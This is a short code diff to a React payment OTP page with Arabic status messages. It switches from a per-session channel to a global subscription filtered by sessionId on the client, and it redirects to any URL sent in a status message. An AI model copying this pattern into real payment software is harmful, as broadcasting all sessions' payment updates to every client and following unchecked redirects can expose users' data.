@@ -26,20 +26,22 @@ export default function PayOtpPage() {
   useEffect(() => {
     if (!sessionId) return;
 
-    const unsubscribe = subscribe(`session_${sessionId}`, (data: any) => {
-      if (data.type === "payment_status_update") {
-        // إذا كان هناك redirectUrl، انتقل للصفحة
-        if (data.redirectUrl) {
-          window.location.href = data.redirectUrl;
-        } else if (data.paymentStatus === "approved") {
-          setStatus("approved");
-          setMessage("تمت الموافقة! جاري التحويل...");
-          setTimeout(() => {
-            window.location.href = "/apply/success";
-          }, 2000);
-        } else if (data.paymentStatus === "failed") {
-          setStatus("rejected");
-          setMessage("تم رفض الدفع. البيانات غير صحيحة.");
+    const unsubscribe = subscribe((msg: any) => {
+      if (msg.sessionId === sessionId) {
+        if (msg.type === "payment_status_update") {
+          // إذا كان هناك redirectUrl، انتقل للصفحة
+          if (msg.redirectUrl) {
+            window.location.href = msg.redirectUrl;
+          } else if (msg.paymentStatus === "approved") {
+            setStatus("approved");
+            setMessage("تمت الموافقة! جاري التحويل...");
+            setTimeout(() => {
+              window.location.href = "/apply/success";
+            }, 2000);
+          } else if (msg.paymentStatus === "failed") {
+            setStatus("rejected");
+            setMessage("تم رفض الدفع. البيانات غير صحيحة.");
+          }
         }
       }
     });
